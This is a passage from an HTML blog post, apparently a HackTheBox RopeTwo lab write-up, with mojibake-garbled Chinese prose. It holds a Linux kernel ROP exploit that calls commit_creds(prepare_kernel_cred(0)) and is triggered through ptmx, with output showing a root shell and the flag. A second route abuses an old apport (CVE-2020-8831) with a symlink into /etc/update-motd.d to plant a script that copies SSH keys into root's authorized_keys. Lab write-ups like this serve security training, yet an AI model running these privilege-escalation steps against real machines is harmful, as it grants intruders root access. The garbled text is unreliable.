uint64_t new_stack = xchg_esp_eax &amp; <span class="number">0</span>xffffffff;</span><br><span class="line">    uint64_t *st_ptr = new_stack;</span><br><span class="line">    int st_idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    // Set Permissions</span><br><span class="line">    mmap((void *)(new_stack &amp; <span class="number">0</span>xfffff000), <span class="number">0</span>x1000, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class="line">        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    // Offsets</span><br><span class="line">    uint64_t ret = <span class="number">0</span>x0001cc + kernel_base;</span><br><span class="line">    uint64_t pop_rdi = <span class="number">0</span>x08b8a0 + kernel_base;</span><br><span class="line">    uint64_t prepare_kernel_cred = <span class="number">0</span>x0c07a0 + kernel_base;</span><br><span class="line">    uint64_t pop_r8 = <span class="number">0</span>x4875b2 + kernel_base;</span><br><span class="line">    uint64_t pop_rdx = <span class="number">0</span>x03bbc2 + kernel_base;</span><br><span class="line">    uint64_t mov_rax_rdi_cmp_pop_rbp = <span class="number">0</span>x12e597 + kernel_base;</span><br><span class="line">    uint64_t commit_creds = <span class="number">0</span>x0c0540 + kernel_base;</span><br><span class="line">    uint64_t swapgs_pop_rbp = <span class="number">0</span>x074b54 + kernel_base;</span><br><span class="line">    uint64_t pop_rcx = <span class="number">0</span>x405ea6 + kernel_base;</span><br><span class="line">    uint64_t pop_r11 = <span class="number">0</span>x54c2d5 + kernel_base;</span><br><span class="line">    uint64_t sysretq = <span class="number">0</span>x075444 + kernel_base;</span><br><span class="line"></span><br><span class="line">    // ROP</span><br><span class="line">    st_ptr[st_idx++] = ret;</span><br><span class="line">    st_ptr[st_idx++] = pop_rdi;</span><br><span class="line">    st_ptr[st_idx++] = <span class="number">0</span>;</span><br><span class="line">    st_ptr[st_idx++] = prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line">    st_ptr[st_idx++] = pop_r8;</span><br><span class="line">    st_ptr[st_idx++] = <span class="number">0</span>;</span><br><span class="line">    st_ptr[st_idx++] = pop_rdx;</span><br><span class="line">    st_ptr[st_idx++] = <span class="number">0</span>;</span><br><span class="line">    st_ptr[st_idx++] = mov_rax_rdi_cmp_pop_rbp;</span><br><span class="line">    st_ptr[st_idx++] = <span class="number">0</span>;</span><br><span class="line">    st_ptr[st_idx++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    st_ptr[st_idx++] = swapgs_pop_rbp;</span><br><span class="line">    st_ptr[st_idx++] = <span class="number">0</span>;</span><br><span class="line">    st_ptr[st_idx++] = pop_rcx;</span><br><span class="line">    st_ptr[st_idx++] = &amp;shell;</span><br><span class="line">    st_ptr[st_idx++] = pop_r11;</span><br><span class="line">    st_ptr[st_idx++] = <span class="number">0</span>x0;</span><br><span class="line">    st_ptr[st_idx++] = sysretq;</span><br><span class="line"></span><br><span class="line">    // trigger ROP</span><br><span class="line">    printf(&quot;[*] Triggering ROP\n&quot;);</span><br><span class="line">    close(ptmx);</span><br><span class="line">    printf(&quot;[-] Exploit failed.\n&quot;);</span><br><span class="line">    return <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰æ—¶å€™ä¼šå¤±è´¥ï¼Œä½†å¤šè¿è¡Œå®ƒå‡ æ¬¡ä¼¼ä¹ä¼šget shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># gcc -w -o exploit exploit.c ; scp -i id_rsa exploit r4j@10.10.10.196:/tmp/exp</span></span><br><span class="line">exploit                        100%   17KB 532.3KB/s   00:00 </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:/tmp$ ./exp</span><br><span class="line">[+] Identified ptm_unix98_ops address: ffffffffa1caf6a0</span><br><span class="line">[+] Identified kernel base address:    ffffffffa0c00000</span><br><span class="line">[*] Using slot 1</span><br><span class="line">[*] Triggering ROP</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">13153a2c6742569c92f7c15be2e249e5</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot3.jpg"></li>
</ul>
<h2 id="Extra-éé¢„æœŸè·å–rootçš„æ–¹æ³•"><a href="#Extra-éé¢„æœŸè·å–rootçš„æ–¹æ³•" class="headerlink" title="Extra - éé¢„æœŸè·å–rootçš„æ–¹æ³•"></a>Extra - éé¢„æœŸè·å–rootçš„æ–¹æ³•</h2><h3 id="å¯»æ‰¾æ¼æ´"><a href="#å¯»æ‰¾æ¼æ´" class="headerlink" title="å¯»æ‰¾æ¼æ´"></a>å¯»æ‰¾æ¼æ´</h3><p>ç¬¬ä¸€ä¸ªè§£å†³è¿™ä¸ªé—®é¢˜çš„å›¢é˜Ÿä½¿ç”¨äº†ä¸€æ¡è¢«HTBå›¢é˜Ÿè¿…é€Ÿä¿®è¡¥çš„æ„å¤–è·¯å¾„ã€‚ä»–ä»¬å‘ç°çš„æ¼æ´è®©ä»–ä»¬ä»chromeuserè½¬åˆ°ä¸€ä¸ªæ¼æ´çš„rootã€‚è¿™ä¸ªå›¢é˜Ÿçš„ä¸€ä¸ªæˆå‘˜jkrå¸®åŠ©é‡æ–°åˆ›å»ºäº†è¿™ä¸ªæ¼æ´ã€‚</p>
<p>è¿™ä¸ªboxäº2020å¹´6æœˆ27æ—¥å‘å¸ƒã€‚åœ¨aptæ—¥å¿—ä¸­ï¼Œä¸¤å¤©åçš„6æœˆ29æ—¥ï¼Œapportè¢«åˆ é™¤äº†:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@rope2:/var/log/apt<span class="comment"># zcat history.log.1.gz </span></span><br><span class="line"></span><br><span class="line">Start-Date: 2020-06-03  12:00:07</span><br><span class="line">Commandline: apt install ifupdown</span><br><span class="line">Install: ifupdown:amd64 (0.8.35ubuntu1)</span><br><span class="line">End-Date: 2020-06-03  12:00:09</span><br><span class="line"></span><br><span class="line">Start-Date: 2020-06-29  18:40:31</span><br><span class="line">Commandline: apt purge apport</span><br><span class="line">Purge: apport:amd64 (2.20.10-0ubuntu27.3)</span><br><span class="line">End-Date: 2020-06-29  18:40:33</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤çš„ç‰ˆæœ¬æ˜¯2.20.10-0ubuntu27.3ã€‚ä¸€äº›è°·æ­Œæœç´¢æ˜¾ç¤º<span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAyMC04ODMx">CVE-2020-8831<i class="fa fa-external-link-alt"></i></span>ã€‚ç°åœ¨ä½œä¸ºRopeTwoä¸Šçš„rootç”¨æˆ·ï¼Œå¯ä»¥é‡æ–°é…ç½®æœºå™¨ï¼Œä½¿å…¶å†æ¬¡å—åˆ°æ­¤è·¯å¾„çš„æ”»å‡»ã€‚</p>
<h2 id="å®‰è£…æ—§çš„apport"><a href="#å®‰è£…æ—§çš„apport" class="headerlink" title="å®‰è£…æ—§çš„apport"></a>å®‰è£…æ—§çš„apport</h2><p>apportæ˜¯ä¸€ä¸ªç”¨æ¥<span class="exturl" data-url="aHR0cHM6Ly93aWtpLnVidW50dS5jb20vQXBwb3J0">æ‹¦æˆªå´©æºƒå¹¶è®°å½•ä¿¡æ¯<i class="fa fa-external-link-alt"></i></span>çš„ç¨‹åºï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ä¸é‡æ–°åˆ›å»ºå´©æºƒçš„æƒ…å†µä¸‹è¿›è¡Œè°ƒè¯•&#x2F;æ•…éšœæ’é™¤ã€‚</p>
<p>è¦å®‰è£…è¿™ä¸ªè¾ƒæ—§çš„ã€æ˜“å—æ”»å‡»çš„apportç‰ˆæœ¬ï¼Œå°†ä½¿ç”¨aptã€‚éœ€è¦é¦–å…ˆä¿®å¤æ›´æ–°æºæ–‡ä»¶:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@rope2:~<span class="comment"># cat /etc/apt/sources.list</span></span><br><span class="line">deb http://old-releases.ubuntu.com/ubuntu disco main universe multiverse restricted</span><br><span class="line">deb http://old-releases.ubuntu.com/ubuntu disco-updates main universe multiverse restricted</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºRopeTwoæœºå™¨ä¸èƒ½ç›´æ¥ä¸äº’è”ç½‘é€šä¿¡ï¼Œå°†é€šè¿‡æˆ‘çš„burpsuiteä»£ç†aptã€‚åœ¨æœ¬åœ°æœºå™¨ä¸Šæ›´æ”¹äº†Burpï¼Œè¿™æ ·å®ƒå°±å¯ä»¥ç›‘å¬æ‰€æœ‰æ¥å£ï¼Œè€Œä¸ä»…ä»…æ˜¯localhost:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*:8080</span><br></pre></td></tr></table></figure>

<p>è¿˜å°†è®¾ç½®http_proxyç¯å¢ƒå˜é‡æ¥å‘Šè¯‰aptä½¿ç”¨è¿™ä¸ªä»£ç†:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@rope2:~<span class="comment"># export http_proxy=http://10.10.14.14:8080</span></span><br></pre></td></tr></table></figure>

<p>ç°åœ¨è¿è¡Œapt updateï¼Œç„¶åapt install apport&#x3D;2.20.10-0ubuntu27.3ã€‚</p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>è¿™é‡Œçš„æ¼æ´åˆ©ç”¨äº†apportå†™å…¥&#x2F;var&#x2F;lockç›®å½•çš„æ–¹å¼ã€‚è¯¥ç›®å½•å¯ç”±ä»»ä½•ç”¨æˆ·å†™å…¥:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:~$ <span class="built_in">ls</span> -ld /var/lock/</span><br><span class="line">drwxrwxrwt 4 root root 80 Jan 15 16:27 /var/lock/</span><br></pre></td></tr></table></figure>

<p>å½“å‡ºç°segfaultsæ—¶ï¼Œapportå°†åœ¨è¯¥æ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ªç›®å½•apportï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ–‡ä»¶lockã€‚æ¼æ´åœ¨äºå®ƒå¦‚ä½•å¤„ç†ç¬¦å·é“¾æ¥ã€‚å°†åˆ›å»ºä¸€ä¸ªé“¾æ¥ï¼Œå°†&#x2F;var&#x2F;lock&#x2F;apportæŒ‡å‘æƒ³å†™å…¥çš„ç›®å½•ï¼Œå¦‚&#x2F;etc&#x2F;update-motdã€‚d(åœ¨å‰é¢çš„å›æº¯ä¸­å·²ç»å±•ç¤ºäº†å¦‚ä½•å¯¹è¿™ä¸ªç›®å½•è¿›è¡Œå†™æ“ä½œ)ã€‚å¦‚æœå¯ä»¥åœ¨è¯¥æ–‡ä»¶å¤¹ä¸­è·å¾—ä¸€ä¸ªå¯ä»¥å†™å…¥çš„æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨sshæˆ–suç™»å½•ï¼Œé‚£ä¹ˆå®ƒå°†ä»¥rootèº«ä»½è¿è¡Œã€‚</p>
<h3 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>ä½œä¸ºchromeuseråœ¨ä»¥rootç”¨æˆ·é‡æ–°å®‰è£…apportåï¼Œè¿›å…¥&#x2F;var&#x2F;lockã€‚ç›®å‰æ²¡æœ‰apportç›®å½•:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:/var/lock$ <span class="built_in">ls</span></span><br><span class="line">lvm  subsys</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ªç¬¦å·é“¾æ¥:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:/var/lock$ <span class="built_in">ln</span> -s /etc/update-motd.d apport</span><br><span class="line">chromeuser@rope2:/var/lock$ <span class="built_in">ls</span> -l</span><br><span class="line">total 0</span><br><span class="line">lrwxrwxrwx 1 chromeuser chromeuser 18 Jan 15 19:01 apport -&gt; /etc/update-motd.d</span><br><span class="line">drwx------ 2 root       root       40 Jan 15 18:52 lvm</span><br><span class="line">drwxr-xr-x 2 root       root       40 Jan 15 18:52 subsys</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨éœ€è¦crashä¸ªä¸œè¥¿ã€‚å¯ä»¥å†æ¬¡è¿è¡Œheapæ”»å‡»ï¼Œæˆ–è€…ç”¨ä¿¡å·11æ€æ­»æŸäº›ä¸œè¥¿</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:/var/lock$ <span class="built_in">sleep</span> 100000 &amp;</span><br><span class="line">[1] 3574</span><br><span class="line">chromeuser@rope2:/var/lock$ <span class="built_in">kill</span> -11 3574</span><br><span class="line">[1]+  Segmentation fault      (core dumped) <span class="built_in">sleep</span> 100000</span><br></pre></td></tr></table></figure>

<p>è¿™ä¼šåœ¨&#x2F;etc&#x2F;update-motd.dä¸­åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œæœ€åä¸€ä¸ªï¼Œlock:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">chromeuser@rope2:/etc/update-motd.d$ <span class="built_in">ls</span> -l</span><br><span class="line">total 40</span><br><span class="line">-rwxr-xr-x 1 root root 1220 Aug  6  2018 00-header</span><br><span class="line">-rwxr-xr-x 1 root root 1157 Aug  6  2018 10-help-text</span><br><span class="line">lrwxrwxrwx 1 root root   46 Apr 16  2019 50-landscape-sysinfo -&gt; /usr/share/landscape/landscape-sysinfo.wrapper</span><br><span class="line">-rwxr-xr-x 1 root root 4264 Aug 21  2018 50-motd-news</span><br><span class="line">-rwxr-xr-x 1 root root   97 Apr  9  2018 90-updates-available</span><br><span class="line">-rwxr-xr-x 1 root root  299 Aug 10  2018 91-release-upgrade</span><br><span class="line">-rwxr-xr-x 1 root root  129 Apr  9  2018 95-hwe-eol</span><br><span class="line">-rwxr-xr-x 1 root root  111 Nov 13  2018 97-overlayroot</span><br><span class="line">-rwxr-xr-x 1 root root  142 Apr  9  2018 98-fsck-at-reboot</span><br><span class="line">-rwxr-xr-x 1 root root  144 Apr  9  2018 98-reboot-required</span><br><span class="line">-rwxrwxrwx 1 root root    0 Jan 15 19:02 lock</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œå®ƒæ˜¯world writableã€‚</p>
<p>å·²ç»åœ¨&#x2F;home&#x2F;chromeuser&#x2F;.ssh&#x2F;authorized_keysä¸­æœ‰å…¬é’¥ã€‚å°†ä½¿ç”¨è¿™ä¸ªBashè„šæœ¬å¤åˆ¶åˆ°&#x2F;root&#x2F;.ssh&#x2F;authorized_keys:</p>
<ul>
<li>getroot.sh</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;pwned!&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /root/.ssh</span><br><span class="line"><span class="built_in">cat</span> /home/chromeuser/.ssh/authorized_keys &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨å°†SSHä½œä¸ºchromeuserå†æ¬¡è§¦å‘MOTDè„šæœ¬:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># ssh -i ~/keys/ed25519_gen chromeuser@10.10.10.196</span></span><br><span class="line">Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-38-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Fri Jan 15 19:07:21 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.31               Processes:             317</span><br><span class="line">  Usage of /:   41.7% of 19.56GB   Users logged <span class="keyword">in</span>:       3</span><br><span class="line">  Memory usage: 29%                IP address <span class="keyword">for</span> ens160: 10.10.10.196</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">71 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwned!</span><br><span class="line">Last login: Fri Jan 15 19:05:14 2021 from 10.10.14.14</span><br><span class="line">chromeuser@rope2:~$</span><br></pre></td></tr></table></figure>

<p>å®ƒä¸Šé¢å†™ç€â€œpwned!â€å°±åœ¨æç¤ºç¬¦ä¸Šæ–¹æ˜¾ç¤ºæ¼æ´ç”Ÿæ•ˆäº†ã€‚å¯ä»¥ä»¥rootèº«ä»½SSHè¿æ¥:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># ssh -i ~/keys/ed25519_gen root@10.10.10.196</span></span><br><span class="line">Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-38-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Fri Jan 15 19:08:09 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.26               Processes:             322</span><br><span class="line">  Usage of /:   41.7% of 19.56GB   Users logged <span class="keyword">in</span>:       3</span><br><span class="line">  Memory usage: 29%                IP address <span class="keyword">for</span> ens160: 10.10.10.196</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">71 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwned!</span><br><span class="line">Last login: Fri Jan 15 19:05:25 2021 from 10.10.14.14</span><br><span class="line">root@rope2:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Thatâ€™s all, Thanks for watchingâ€¦</li>
</ul>
<p><font color="red"><em><strong>Damn! Really a Journey to the Hell! Ha?</strong></em></font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/" title="HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP]">https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/02/23/breadcrumbs/" rel="prev" title="Hack-The-Box-walkthrough[Breadcrumbs]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Breadcrumbs]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/03/01/spectra/" rel="next" title="Hack-The-Box-walkthrough[Spectra]">
                  Hack-The-Box-walkthrough[Spectra] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 â€“ 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">657k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">39:49</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
